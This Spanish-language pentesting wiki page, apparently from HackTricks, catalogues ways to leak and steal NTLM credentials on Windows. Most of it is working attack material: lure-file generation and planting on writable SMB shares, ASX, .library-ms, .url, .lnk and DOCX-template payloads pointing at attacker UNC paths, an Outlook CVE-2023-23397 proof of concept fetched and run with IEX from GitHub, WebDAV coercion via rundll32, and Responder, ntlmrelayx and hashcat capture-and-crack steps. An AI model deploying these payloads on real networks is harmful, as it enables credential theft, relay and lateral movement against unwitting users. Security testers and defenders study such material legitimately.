# Lugares donde robar credenciales NTLM

{{#include ../../banners/hacktricks-training.md}}

**Consulta todas las excelentes ideas de [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) desde la descarga de un archivo de Microsoft Word online hasta la fuente de ntlm leaks: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md y [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### Recurso compartido SMB con permisos de escritura + señuelos UNC activados por Explorer (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Si puedes **escribir en un recurso compartido al que los usuarios o las tareas programadas acceden mediante Explorer**, coloca archivos cuyos metadatos apunten a tu UNC (por ejemplo, `\\ATTACKER\share`). Al renderizar la carpeta se activa la **autenticación SMB implícita** y se filtra un **NetNTLMv2** a tu listener.<sup>[[1]](#references)</sup>

1. **Genera señuelos** (cubre SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Déjalos en el recurso compartido con permisos de escritura** (cualquier carpeta que abra la víctima):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Escuchar y crackear**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows puede acceder a varios archivos a la vez; cualquier elemento que Explorer previsualice (`BROWSE TO FOLDER`) no requiere clics.

### Windows Media Player playlists (.ASX/.WAX)

Si consigues que un objetivo abra o previsualice una playlist de Windows Media Player que controles, puedes hacer leak de Net-NTLMv2 apuntando la entrada a una ruta UNC. WMP intentará obtener el medio referenciado mediante SMB y se autenticará implícitamente.<sup>[[3]](#references)[[4]](#references)</sup>

Ejemplo de payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Flujo de recopilación y cracking:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer gestiona de forma insegura los archivos .library-ms cuando se abren directamente desde un archivo ZIP. Si la definición de la biblioteca apunta a una ruta UNC remota (por ejemplo, \\attacker\share), simplemente explorar o iniciar el archivo .library-ms dentro del ZIP hace que Explorer enumere la UNC y envíe autenticación NTLM al atacante. Esto proporciona un NetNTLMv2 que puede crackearse offline o potencialmente retransmitirse.<sup>[[2]](#references)</sup>

Minimal .library-ms pointing to an attacker UNC
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Pasos operativos
- Crea el archivo .library-ms con el XML anterior (establece tu IP/hostname).
- Comprímelo (en Windows: Enviar a → Carpeta comprimida (zip)) y entrega el ZIP al objetivo.
- Ejecuta un listener de captura NTLM y espera a que la víctima abra el archivo .library-ms desde dentro del ZIP.


### Ruta de sonido del recordatorio del calendario de Outlook (CVE-2023-23397) – leak de Net-NTLMv2 zero-click

Microsoft Outlook para Windows procesaba la propiedad MAPI extendida PidLidReminderFileParameter en los elementos del calendario. Si esa propiedad apuntaba a una ruta UNC (por ejemplo, \\attacker\share\alert.wav), Outlook se conectaba al recurso compartido SMB cuando se activaba el recordatorio, filtrando el Net-NTLMv2 del usuario sin necesidad de hacer clic. Esto se corrigió el 14 de marzo de 2023, pero sigue siendo muy relevante para flotas legacy/sin actualizar y para la respuesta a incidentes históricos.<sup>[[5]](#references)</sup>

Explotación rápida con PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Lado del listener:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Notas
- La víctima solo necesita tener Outlook para Windows en ejecución cuando se active el recordatorio.
- El leak proporciona Net‑NTLMv2, apto para cracking offline o relay (no pass-the-hash).


### .LNK/.URL icon-based zero-click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer renderiza automáticamente los iconos de los accesos directos. Investigaciones recientes demostraron que, incluso después del parche de Microsoft de abril de 2025 para los accesos directos con iconos UNC, todavía era posible activar la autenticación NTLM sin hacer clic alguno alojando el destino del acceso directo en una ruta UNC y manteniendo el icono local (el bypass del parche recibió el identificador CVE‑2025‑50154). Simplemente ver la carpeta hace que Explorer recupere metadatos del destino remoto y envíe NTLM al servidor SMB del atacante.<sup>[[6]](#references)</sup>

Payload mínimo de Internet Shortcut (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Payload de acceso directo de programa (.lnk) mediante PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Ideas de entrega
- Coloca el shortcut en un ZIP y consigue que la víctima lo explore.
- Coloca el shortcut en un recurso compartido con permisos de escritura que la víctima abra.
- Combínalo con otros archivos señuelo en la misma carpeta para que Explorer muestre una vista previa de los elementos.

### No-click .LNK NTLM leak mediante la ruta del icono ExtraData (CVE‑2026‑25185)

Windows carga los metadatos de `.lnk` durante la **visualización/vista previa** (renderizado del icono), no solo durante la ejecución. CVE‑2026‑25185 muestra una ruta de análisis en la que los bloques **ExtraData** hacen que el shell resuelva una ruta de icono y acceda al sistema de archivos **durante la carga**, emitiendo NTLM saliente cuando la ruta es remota.

Condiciones clave del trigger (observadas en `CShellLink::_LoadFromStream`):
- Incluir **DARWIN_PROPS** (`0xa0000006`) en ExtraData (activa la rutina de actualización del icono).
- Incluir **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) con **TargetUnicode** rellenado.
- El loader expande las variables de entorno en `TargetUnicode` y llama a `PathFileExistsW` sobre la ruta resultante.

Si `TargetUnicode` se resuelve en una ruta UNC (por ejemplo, `\\attacker\share\icon.ico`), **simplemente visualizar una carpeta** que contenga el shortcut provoca autenticación saliente. La misma ruta de carga también puede activarse mediante la **indexación** y el **análisis del antivirus**, lo que la convierte en una superficie práctica de leak sin clics.<sup>[[7]](#references)</sup>

Las herramientas de research (parser/generator/UI) están disponibles en el proyecto **LnkMeMaybe** para crear/inspeccionar estas estructuras sin utilizar la GUI de Windows.<sup>[[8]](#references)</sup>


### Coerción de autenticación de WebDAV / validación de credenciales mediante `davclnt.dll,DavSetCookie`

El **cliente WebDAV** nativo puede abusarse para forzar a la sesión de inicio de sesión actual a autenticarse contra un endpoint **HTTP/WebDAV** arbitrario:
```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```
Por qué es útil:
- Contra un **servidor WebDAV controlado por el atacante**, puede activar **NTLM over HTTP** sin implementar un cliente personalizado.
- Contra **hosts internos**, es una forma discreta de **validar dónde se aceptan las credenciales robadas** antes de realizar movimientos laterales.<sup>[[9]](#references)</sup>
- El comando es una buena alternativa cuando la **salida SMB está filtrada**, pero **HTTP/WebDAV** sigue estando accesible.

Notas operativas:
- El servicio **WebClient** debe estar ejecutándose en el host de origen.
- `rundll32.exe` carga `davclnt.dll` y hace que Windows gestione la autenticación WebDAV utilizando las **credenciales del usuario actual**.<sup>[[10]](#references)</sup>
- Si lo diriges a una infraestructura que controlas, utiliza un listener/relay HTTP compatible con NTLM, como:
```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```
Desde una perspectiva de detección, las ejecuciones repetidas de `rundll32.exe davclnt.dll,DavSetCookie` contra muchos sistemas internos son una señal sólida de **validación de credenciales / preparación de movimiento lateral similar a un spray**, en lugar de un comportamiento normal del usuario.<sup>[[9]](#references)[[11]](#references)</sup>

### Inyección de plantillas remotas de Office (.docx/.dotm) para forzar NTLM

Los documentos de Office pueden hacer referencia a una plantilla externa. Si configuras la plantilla adjunta con una ruta UNC, al abrir el documento se autenticará mediante SMB.

Cambios mínimos en las relaciones de DOCX (dentro de word/):

1) Edita word/settings.xml y añade la referencia a la plantilla adjunta:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Edita word/_rels/settings.xml.rels y apunta rId1337 a tu UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Vuelve a empaquetar en .docx y entrégalo. Ejecuta tu SMB capture listener y espera a que se abra.

Para consultar ideas de post-capture sobre relaying o abusing NTLM, revisa:

{{#ref}}
README.md
{{#endref}}


## Referencias
- [1] [HTB: Breach – señuelos en shares con permisos de escritura + captura con Responder → crack de NetNTLMv2 → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – auth leak mediante ZIP .library‑ms (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 hasta DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — NTLM leak de WMP → junction NTFS al webroot RCE → FullPowers + GodPotato hasta SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5 vulnerabilidades de NTLM: amenazas de privilege escalation sin parchear en Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft mitiga Outlook EoP (CVE‑2023‑23397) y explica el NTLM leak mediante PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – Zero-click, one NTLM: bypass del security patch de Microsoft (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: una revisión de CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [Herramientas de TrustedSec para LnkMeMaybe](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – Cuando llama IT Support: diseccionando una campaña de ModeloRAT desde Teams hasta el Domain Compromise](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – header davclnt.h](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – solicitud WebDAV de Windows Rundll32](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)


{{#include ../../banners/hacktricks-training.md}}
